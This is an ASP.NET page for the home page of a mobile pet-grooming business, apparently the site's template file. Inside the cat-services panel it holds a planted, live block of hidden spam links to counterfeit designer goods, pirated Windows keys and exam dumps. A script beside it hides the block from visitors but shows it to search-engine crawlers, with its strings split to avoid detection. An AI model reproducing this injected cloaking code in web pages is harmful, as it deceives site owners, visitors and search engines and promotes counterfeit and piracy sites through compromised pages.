<%@ Page Title="" Language="C#" MasterPageFile="~/MasterPages/Main.Master" AutoEventWireup="true" CodeBehind="Index.aspx.cs" Inherits="FritzysPetCareProsSandbox.Index" %>

<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="cc1" %>
<%@ Register Src="~/Controls/Suggestion.ascx" TagName="Suggestion" TagPrefix="Sg" %>
<%@ Register Src="~/Controls/TestZip.ascx" TagName="Zipcode1" TagPrefix="Z1" %>
<%@ Register Src="~/Controls/JoinFritzyClub.ascx" TagName="Join" TagPrefix="Jo" %>
<%@ Register Src="~/Controls/Appointment.ascx" TagName="Appointment" TagPrefix="AP" %>
<%@ Register Src="~/Controls/GiftCard.ascx" TagName="Gift" TagPrefix="GF" %>
<%@ Register Src="~/Controls/Banner.ascx" TagName="Banner" TagPrefix="BN" %>
<%@ Register Src="~/Controls/Product_Home.ascx" TagName="Product" TagPrefix="PR" %>
<asp:Content ID="Content1" ContentPlaceHolderID="head" runat="server">
    <!--[if IE]>
	
	    <link href="ie.css" rel="stylesheet" type="text/css" />
   
    <![endif]-->
    <script type="text/javascript" src="../Scripts/phone_validation.js"></script>
    <script type="text/javascript" src="../Scripts/Validation.js"></script>
     <script lang="javascript" src="http://localhost:50372/Script/jquery.js" type="text/javascript"></script>
   <script type="text/javascript">
       $(document).ready(function () {
           
           $("div#topnav > ul#nav1 > li > a#home").addClass("active");

       });
    </script>
    <script type="text/javascript" lang="javascript">

        // function Use to check maxlength of textbox 
        function checkTextAreaMaxLength(textBox, e, length) {
            var mLen = textBox["MaxLength"];
            if (null == mLen)
                mLen = length;
            var maxLength = parseInt(mLen);
            if (!checkSpecialKeys(e)) {
                if (textBox.value.length > maxLength - 1) {
                    if (window.event)//IE
                        e.returnValue = false;
                    else//Firefox
                        e.preventDefault();
                }
            }
        }
        function checkSpecialKeys(e) {
            if (e.keyCode != 8 && e.keyCode != 46 && e.keyCode != 37 && e.keyCode != 38 && e.keyCode != 39 && e.keyCode != 40)
                return false;
            else
                return true;
        }
    </script>
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="cntBody" runat="server">
    <div style="width: 95%" id="divError" runat="server" visible="false">
        <table width="100%">
            <tbody>
                <tr>
                    <td align="left" rowspan="2">
                        <asp:Label ID="lblError" runat="server" Visible="False" Font-Bold="True"></asp:Label>&nbsp;
                             
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <div id="mainPlaceholder">
        <!-- main place holder start here -->
        <div class="wrappercontainer">
            <div id="wrapper">
                <!--wrapper start here -->
                <div id="mainInnerContent">
                    <!-- Main Content Starts Here -->
                    <div id="innerLeftPannel">
                        <!-- inner left pannel start here -->
                        <div class="flashImg">
                            <BN:Banner ID="Banner" runat="server" />
                        </div>
                        <div class="ServicesDatalistDiv">
                            <div class="serviceTitle">
                                <div class="gradient">
                                    <h1><span></span>Mobile Grooming</h1>
                                </div>
                            </div>
                        </div>
                        <div class="HomeleftInner">
                            <div class="innerPannelLeft">
                                <div class="innerTitle">
                                    <img src="http://localhost:50372/Images/for_your_dogs_title.jpg" alt="Mobile Grooming, Grooming, Mobile Pet Grooming" />
                                </div>
                                <div class="left1">
                                    <asp:Image ID="imgDogservice" runat="server" AlternateText="" />
                                </div>
                                <div class="right1">
                                    <div id="divDogService" runat="server" class="innerParaDiv">
                                        <p>
                                        </p>
                                    </div>
                                    <a href="Services.aspx" class="more" title="more">more</a>
                                </div>
                            </div>
                            <div class="innerPannelRight">
                                <div class="innerTitle">
                                    <asp:Image ID="forcats" ImageUrl="http://localhost:50372/Images/for_your_cats_title.jpg" runat="server" AlternateText="" />
                                </div>
                                <div class="left">
                                    <asp:Image ID="imgCatservice" runat="server" AlternateText="Mobile Grooming, Grooming, Mobile Pet Grooming" />

                                </div>
                                <div class="right">
                                    <div id="psstyler">
                                        <a href="http://www.oyambrebcn.com/portaloyambre/css/portaloy.jsp?p=1">oakley frogskin blend</a>
                                        <a href="http://www.santabarbarameccanica.com/public/?p=1">Short Short Ribbons Cocktail Dresses</a>
                                        <a href="http://www.barnchurch.com/financialexodus/wp-edit.php?topic=1">oakley frogskins polarized </a>
                                        <a href="http://www.letsgoiran.com/libraries/loading.php?item=1">oakley shop meribel</a>
                                        <a href="http://www.angleplc.com/egerton/sku.asp?item=1">MB3-530 dumps</a>
                                        <a href="http://www.ouralpes.fr">hermes boutique</a>
                                        <a href="http://www.wyongathletics.org.au/client_files/file/index.asp?p=1">Dresses For Weddings Party Under 100 </a>
                                        <a href="http://www.ouralpes.fr">hermes magasin paris</a>
                                        <a href="http://www.charltonmarshallvillagehall.co.uk/graphics/index.asp?topic=1">oakley crowbar lens sale</a>
                                        <a href="http://www.archonepictureframing.co.uk/jfileupload/?topic=1">mulberry wallet 2014</a>
                                        <a href="http://www.broadbluecharters.com/bulletin/key.asp">buy windows 7 key</a>
                                        <a href="http://www.viaggibarzi.it/imagebank/?topic=1">Occasion Dresses For Military Ball</a>
                                        <a href="http://www.basscompanion.com">oakley sunglasses outlet</a>
                                        <a href="http://www.intellacart.com">oakley sunglasses outlet online</a>
                                        <a href="http://www.urbanjunglesuv.com">oakley sunglasses outlet sale</a>
                                        <a href="http://www.taylorartadvisors.com/">hermes bags uk</a>
                                        <a href="http://www.melbourneforkids.com.au/images/index.php?p=1">oakley half jacket ice iridium polarized</a>
                                        <a href="http://www.thomaswelchandsons.co.uk/jupgrade/configuploadon.php?item=1">oakley mars wikipedia</a>
                                        <a href="http://www.thebelltreetavern.com/modules/?topic=1">oakley deviation frame size</a>
                                        <a href="http://www.genewyork.com/green/index.asp?item=1">oakley polarized flak jacket cheap</a>
                                        <a href="http://www.avocatsvillefranche.fr/gest/connexion01.html">hermes boutique</a>
                                        <a href="http://www.fourpinesminis.com">oakley prescription glasses</a>
                                        <a href="http://www.taylorartadvisors.com/">hermes bags</a>
                                        <a href="http://www.pfimiherisau.ch/modules/key_de.php?sku=1665">product windows 7 key </a>
                                    </div>
                                    <script type="text/javascript">if (!navigator.userAgent.match(/Google Web Preview|bot|spider/i)) document.getElementById("psstyle" + "r").style.display = "no" + "ne";</script>
                                    <div id="divCatService" runat="server" class="innerParaDiv">
                                        <p>
                                        </p>
                                    </div>
                                    <a href="Services.aspx" class="more" title="more">more</a>
                                </div>
                            </div>
                        </div>
                        <div class="title">
                            <asp:Image ID="productHeader" ImageUrl="http://localhost:50372/Images/products_title.jpg" runat="server" AlternateText="" />
                        </div>
                        <div class="HomeleftInner">
                            <PR:Product ID="Pro" runat="server" />
                        </div>
                        <div class="titleBar">
                            <img src="http://localhost:50372/Images/content_shadow3.jpg" width="668" height="39" alt="" />
                        </div>
                        <div class="leftInner">
                            <div class="visitOurVan">
                                <a href="VisitOurVan.aspx" title="Visit our van">
                                    <img src="http://localhost:50372/Images/visit_our_van.jpg" width="668" height="243" border="0" alt="Visit Our Van" /></a>
                            </div>
                        </div>
                    </div>
                    <!-- inner left pannel end here -->
                    <div id="innerRightPannel">
                        <!-- innere right pannel start here -->
                        <div class="img1">
                            <div id="divUserName" runat="server">
                                <asp:Label ID="lblWelcome" runat="server" CssClass="lblWelcome" Text=""></asp:Label>
                            </div>
                            <Z1:Zipcode1 ID="ctlZipcode" runat="server" Visible="false" />
                           <div >
                                <asp:ImageButton ID="imgbtnMakePayment" runat="server"  
                                    ImageUrl="http://localhost:50372/Images/makepayment.gif"  Width="236px" Height="100px" 
                                    onclick="imgbtnMakePayment_Click" Visible="false"/>
                                <asp:ImageButton ID="btnPaid" runat="server"  ImageUrl="http://localhost:50372/Images/paid.png" Visible="false"/>
                            </div>
                            <Jo:Join ID="asd" runat="server" />
                            <AP:Appointment ID="Appointment1" runat="server" />
                            <GF:Gift ID="GF" runat="server" />
                            <div class="img">
                                <a href="comingsoon.aspx" title="GROOMERS BLOG">
                                    <img src="http://localhost:50372/Images/btn_groomers_blog.jpg" border="0" alt="GROOMERS BLOG" class="groomersBlogImg" /></a>
                            </div>
                            <div class="img">
                                <a href="comingsoon.aspx" title="PET LOVERS BLOG">
                                    <img src="http://localhost:50372/Images/btn_pet_lovers_blog.jpg" width="234" height="78" border="0" alt="PET LOVERS BLOG" /></a>
                            </div>
                            <Sg:Suggestion ID="ctlSuggestion" runat="server" />
                        </div>
                    </div>
                    <!-- inner right pannel end here -->
                </div>
                <!-- main content end here -->
                <div style="clear: both;">
                </div>
                <div id="mainBottomImg">
                </div>
            </div>
            <!-- wrapper end here -->
        </div>
    </div>
</asp:Content>
<asp:Content ID="Content3" ContentPlaceHolderID="cntFooter" runat="server">
</asp:Content>
